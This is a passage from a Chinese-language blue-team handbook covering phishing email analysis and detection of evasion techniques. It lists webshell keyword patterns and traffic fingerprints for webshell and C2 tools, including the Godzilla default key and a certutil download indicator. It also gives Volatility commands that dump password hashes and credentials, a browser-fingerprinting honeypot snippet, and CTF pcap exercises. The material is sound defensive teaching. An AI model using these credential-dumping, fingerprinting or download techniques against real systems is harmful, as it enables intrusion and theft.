txt += "<p>用户代理：" + navigator.userAgent + "</p>";
txt += "<p>用户代理语言：" + navigator.language + "</p>";
```

配合弹窗 `alert` / `confirm` / `prompt` 可诱导攻击者交互，进一步采集信息。

---

## 九、钓鱼攻击识别与反制溯源
### 9.1 钓鱼邮件分析
攻击链回顾（见 2.3）：信息收集/爆破邮箱 → 用内部邮箱发钓鱼 → 骗密码或投木马。蓝队拿到可疑邮件后分三层看：

**① 看邮件头（溯源发件真相）**

+ `Received` 链：逐跳还原真实发送路径和源 IP。
+ `SPF / DKIM / DMARC`：校验结果判断邮件是否被伪造。
+ `X-Originating-IP`：原始发件 IP。
+ `Reply-To` 与 `From` 不一致：典型钓鱼特征（显示是领导，回复到外部邮箱）。

**② 看附件（研判载荷）**

+ 先算 hash，到 VirusTotal / 微步查威胁情报（见 4.3）。
+ 沙箱运行观察行为，不要在真实环境直接打开。
+ 警惕：带宏的 Office、双扩展名（`xx.pdf.exe`）、ISO/IMG/img 等容器、LNK 快捷方式。
+ 攻击者常用伪装手法（蓝队**不能**仅凭图标或文件名判断可信）：替换图标伪装成正常程序、伪造数字签名、文件名社会工程。

**③ 看链接（研判落地页）**

+ 仿冒域名（`rnicrosoft`、`0` 代 `o` 等形近字）。
+ 短链还原真实地址，追踪重定向链。
+ 克隆登录页骗取账号密码。

### 9.2 钓鱼载荷的免杀手法（蓝队检测视角）
蓝队要"知己知彼"——了解攻击者让木马躲过杀软的常见思路，才能针对性地检测（**此处只讲检测思路，不讲制作**）：

| 攻击者手法 | 蓝队检测对策 |
| --- | --- |
| shellcode 加载器（分离加载，文件里看不到完整 PE） | 不能只靠静态特征/hash，要用 **EDR 行为检测**：看进程是否申请可执行内存、是否注入 |
| 加密 shellcode（运行时解密） | 静态查不到，靠**行为**和**内存**特征；内存扫描（呼应第七章 `malfind`） |
| 加壳（upx / vmp / themida 类） | 检测壳特征、加壳程序重点标记；沙箱脱壳后二次查杀 |
| 伪造图标/签名 | **不轻信图标和签名**，结合行为 + 信誉 + 网络外联综合判断 |
| 行为规避（反沙箱、反调试、延时执行） | 沙箱加长运行时间、模拟真实环境、多维度行为采集 |


> 关键原则：**静态特征（hash、文件名、图标、签名）越来越不可靠，必须转向行为检测 + 网络层 C2 识别**。网络层正好对接第六章：CS 的 checksum8、MSF 的 MZ 标头、Webshell 工具的固定行为指纹。
>

### 9.3 反制与溯源
**① 蜜罐溯源**：布 JSONP/XSS 蜜罐，攻击者浏览器登录过相关网站就被采集身份信息。

**② 样本 IOC 提取 + 威胁情报比对**：从样本和流量中提取 **IP、域名、hash、互斥体(Mutex)、注册表键、文件路径、C2 端口** 等 IOC，到微步、VirusTotal 等平台比对，扩充攻击者画像。

**③ 攻击者画像**：把钓鱼邮箱、发件 IP、C2 基础设施、样本家族、使用的免杀手法串起来，形成可追踪的攻击者档案。

**④ 处置闭环**：隔离受害主机 → 取证（内存/磁盘，见第七章）→ 清除后门/木马（见第三、四章）→ 加固（补漏洞、改密码、收策略）→ 复盘总结（输出报告，按 ATT&CK 归类）。

---

## 蓝队检查手册
### A. Webshell 静态特征关键词（PHP）
```plain
eval | assert | create_function | preg_replace(/e) | preg_filter
mb_ereg_replace(ee) | base64_decode | base64_encode | file_put_contents
shell_exec | passthru | system | $_POST | $_REQUEST | 动态函数 $a($b)
phpspy | c99sh | milw0rm | spider_bc | gunerpress
```

**流量加密三件套**：蚁剑（明文/协商明文）、哥斯拉（key `3c6e0b8a9c15224a`、响应体 MD5 标记）、冰蝎（AES128 + `php://input` + session 密钥）。

### B. 攻击流量识别速查表
| 攻击/工具 | 核心识别特征 |
| --- | --- |
| AWVS 漏扫 | 参数/UA/Content-Type 含 `test` `testing` `wvs` `acunetix` `acunetix_wvs` `acunetix_wvs_security_test` |
| 蚁剑 | 明文传输，密码协商过程有明文 |
| 冰蝎 | 固定 UA 池；请求/响应体头部字节不变；Referer 文件名纯大/小写 |
| 哥斯拉 | 同一 TCP 内：payload(空响应)→test(固定)→getBasisInfo；Cookie 尾带 `;`；响应体前后 16 位组 32 位 MD5 |
| Metasploit | 数据含 MZ 标头、DOS 模式异常 |
| CobaltStrike | stage URI 满足 `sum(URI字符ASCII) % 256 == 92`；固定 sleep 心跳；任务经心跳返回包下发；POST 回传 |
| 样本外联下载 | `certutil -urlcache -split -f` |


### C. 过滤表达式备查
```latex
# Wireshark 显示过滤
http.request.method == "POST"
http.cookie == "PHPSESSID=..."
ip.addr == 192.168.1.104 and icmp
(http contains "{\"success\":true}" or http.request.method=="POST") and ip.addr==192.168.94.59
tcp contains "inet addr"

# tcpdump
tcpdump -vvAls0 | grep 'POST'
tcpdump -i eth1 host X and port Y -w out.pcap

# 哥斯拉响应体正则
(?i:[0-9A-F]{16})[\w+/]{4,}=?=?(?i:[0-9A-F]{16})
# CS checksum8 校验
sum(URI 字符 ASCII) % 256 == 92
```

### D. Volatility 内存取证命令清单
```bash
python2 vol.py -f x.raw imageinfo                          # 识别 Profile
python2 vol.py -f x.raw --profile=Win7SP1x64 pslist         # 进程列表
python2 vol.py -f x.raw --profile=Win7SP1x64 pstree         # 进程树
python2 vol.py -f x.raw --profile=Win7SP1x64 psscan         # 池扫描找隐藏进程
python2 vol.py -f x.raw --profile=Win7SP1x64 psxview        # 多视角隐藏检测
python2 vol.py -f x.raw --profile=Win7SP1x64 procdump -p 520 -D ./   # 转储进程
python2 vol.py -f x.raw --profile=Win7SP1x64 cmdscan        # 命令历史
python2 vol.py -f x.raw --profile=Win7SP1x64 cmdline        # 命令行参数
python2 vol.py -f x.raw --profile=Win7SP1x64 filescan | grep hint.txt   # 文件扫描
python2 vol.py -f x.raw --profile=Win7SP1x64 dumpfiles -Q 0x... -D ./  # 提取文件
python2 vol.py -f x.raw --profile=Win7SP1x64 netscan        # 网络连接
python2 vol.py -f x.raw --profile=Win7SP1x64 svcscan        # 服务
python2 vol.py -f x.raw --profile=Win7SP1x64 hashdump       # 密码哈希
python2 vol.py -f x.raw --profile=Win7SP1x64 mimikatz       # 明文凭证
python2 vol.py -f x.raw --profile=Win7SP1x64 malfind        # 注入检测
python2 vol.py -f x.raw --profile=Win7SP1x64 iehistory      # 浏览历史
```

### E. 蓝队应急排查命令清单
```bash
# === Linux ===
# Web 日志：统计 源IP+文件+次数
cat access.log | awk '{print $1 $7}' | sort | uniq -c | sort -nr
# Webshell 特征匹配
find /var/www/html/ -name "*.php" | xargs egrep 'eval|assert|system|base64_decode|\$\(_POST'
# 按修改时间找最近改动
ls -lt --time-style="+%Y-%m-%d %H:%M:%S" /var/www/html/ | head
# 隐藏文件
ls -la /tmp /var/tmp
# 计划任务 / 进程 / 网络
crontab -l
ps -ef
netstat -anptu
```

```plain
:: === Windows ===
netstat -ano                       :: 查网络连接
tasklist /svc                      :: 进程与对应服务
wmic process list full             :: 进程全量信息（含命令行、路径）
schtasks /query /fo LIST /v        :: 计划任务
:: 临时目录、启动项、注册表自启 也要重点排查
```

### F. 在线工具汇总
| 类别 | 工具 / 地址 |
| --- | --- |
| Webshell 查杀 | shellpub `shellpub.com`、百度 WEBDIR+ `scanner.baidu.com`、长亭 `stack.chaitin.com` |
| 样本检测 | VirusTotal `virustotal.com`、VirSCAN `virscan.org`、腾讯哈勃 `habo.qq.com` |
| 沙箱 | 麦克云 `mac-cloud.riskivy.com`、微步 `s.threatbook.com` |
| 威胁情报 | 微步在线、VirusTotal |
| 勒索解密 | 深信服 EDR `edr.sangfor.com.cn`、NoMoreRansom `nomoreransom.org` |
| 内存马查杀 | `github.com/4ra1n/shell-analyzer` |
| 框架 | ATT&CK `attack.mitre.org` |


---

> **结语**：护网蓝队的核心能力链 = **摸清资产 → 监测告警 → 看懂流量 → 查杀后门 → 内存取证 → 蜜罐/钓鱼溯源 → 处置加固**。把每章的命令和特征在靶场里跑一遍，比看十遍文档都有用。演练中按 ATT&CK 归类、按 IOC 留证、按流程上报，就是合格的蓝队。
>

---

## 实战练习：四个流量包分析
下面四个流量包是流量分析模块的配套练习，分别考察 SMTP 协议分析、TCP 流还原、ICMP 隐写、HTTP 攻击溯源与压缩数据解码。建议先自己上手分析，卡住了再对照下面的思路。流量包和配套脚本放在「练习题」目录下。

### 练习一：SMTP 中的 flag　（流量包：SMTP中的flag.pcap）
**考察知识点**

+ SMTP 协议的邮件传输流程（EHLO → AUTH LOGIN → MAIL FROM → DATA）
+ SMTP 认证阶段用户名、密码以 Base64 编码传输的特性
+ Base64 编码的识别与解码

**解题思路**

1. 打开流量包，过滤 `smtp`，能看到完整的 SMTP 交互过程：三次握手建立连接后开始邮件传输。
2. SMTP 在 `AUTH LOGIN` 认证时，账号和密码是 Base64 编码后发送的——这是协议规定，并不是真正的加密；邮件正文里也可能出现 Base64 内容。
3. 跟踪 TCP 流（右键 → Follow → TCP Stream），定位到认证字段或邮件内容里那段可疑的 Base64 字符串。
4. 对这段 Base64 解码（Wireshark 选中即可看到解码结果，或用 CyberChef、`base64 -d`），flag 就在解码结果里。

### 练习二：路由交换传递的密码　（流量包：路由交换传递的密码.pcapng）
**考察知识点**

+ 协议识别：LOOP（环回）流量的判读
+ TCP 流跟踪（Follow TCP Stream）逐流还原数据
+ 一个 pcap 里有多条 TCP 流时，每条都要看，不能只看第一个

**解题思路**

1. 打开流量包，发现大量 LOOP 协议——这是路由交换设备的环回测试流量，属于背景噪声，不是答案所在，先排除掉。
2. 过滤 `tcp`，按习惯先看 TCP 流量。
3. 逐个跟踪 TCP 流：先看流 0，能看到一些传输内容的线索；但答案通常不会放在第一个流里。
4. 切换到流 1（在 Follow TCP Stream 窗口里修改 Stream 编号），在流 1 的数据里找到完整的 flag。
5. 要点：一个 pcap 里可能有多条 TCP 流，研判时务必把每条流都跟一遍，避免遗漏。

### 练习三：多重影分身　（流量包：多重影分身.pcap）
**考察知识点**

+ ICMP 协议与 ICMP 载荷（payload）结构
+ 数据隐写：把信息拆成单个字符，分散藏到一批包里
+ 用字符串搜索快速定位可疑分组

**解题思路**

1. 流量包乍看是正常的应用流量，没有明显异常。
2. 用「查找分组」（Ctrl+F）按字符串搜 `flag`，命中一个 ICMP 包，里面有提示「flag 在这」。
3. 顺着这个包查看同一批 ICMP 报文，发现每个 ICMP 包的某个固定偏移位置都藏了一个字符——flag 被拆成"影分身"，分散在多个包里。
4. 把这批 ICMP 包按顺序、在同一偏移位置的字节逐个取出来。
5. 按包顺序拼接所有字符，得到完整 flag。

> 延伸：往 ICMP payload 里塞数据是典型的隐蔽通信手法（ICMP 隧道 / ICMP 隐写）。蓝队遇到大量规律性 ICMP 且载荷异常时，要警惕有人在拿 ICMP 偷传数据。
>

### 练习四：跟踪黑客的行为（应急响应）　（流量包：黑客入侵之流量分析.pcap）
**考察知识点**

+ HTTP 状态码研判：用 404 / 200 判断攻击是否成功
+ 命令执行漏洞的流量识别
+ Base64 + gzcompress 组合：压缩数据在响应体里的提取与解码
+ zlib 压缩流魔数 `78 9c` 的识别

**解题思路**

1. 这是一个应急响应情景：已经发现黑客攻击行为，要从流量里还原他干了什么。先过滤 `http`。
2. 看到大量 `404` 响应 → 黑客在做目录 / 路径爆破（字典扫描），这些都没打成功。
3. 关键是找出返回 `200` 的请求。发现其中有 3 条 `200`，说明攻击成功执行了。
4. 查看这 3 条请求：第一条利用站点的命令执行漏洞执行命令，拿到 PHP 站点的 `phpinfo` 信息，确认漏洞存在。
5. 继续看后面两条命令。其中一条请求里带了一段 PHP 代码：先 Base64 解码出文件名 `flag.txt`，读取该文件内容，再用 `gzcompress` 压缩，最后 `print_r` 输出。也就是说 flag 被压缩后塞进了 HTTP 响应体。
6. 响应体是二进制数据，开头 `78 9c` 正是 zlib 压缩流的魔数（magic bytes），印证了它是 gzcompress 压出来的数据。
7. 提取：选中该响应包 →「文件 → 导出分组字节流（Export Packet Bytes）」，保存为 `1.gz`。
8. 解码：配套的 `poc.php` 用的就是 `gzuncompress`：

```php
<?php
$a = gzuncompress(file_get_contents('1.gz'));
echo $a;
?>
```

   不想用 PHP 也可以直接 Python 解：

```python
import zlib
print(zlib.decompress(open('1.gz', 'rb').read()).decode())
```

9. 解压后即得到 flag。

> 爆破（404）→ 命令执行漏洞成功（200）→ 读取 flag.txt 并用 gzcompress 压缩回传 → 识别 `78 9c` 魔数 → 导出分组字节流 → zlib 解压。这条链路把"攻击研判 + 数据提取 + 编码解码"完整串了起来，是流量分析综合题的典型套路。
>

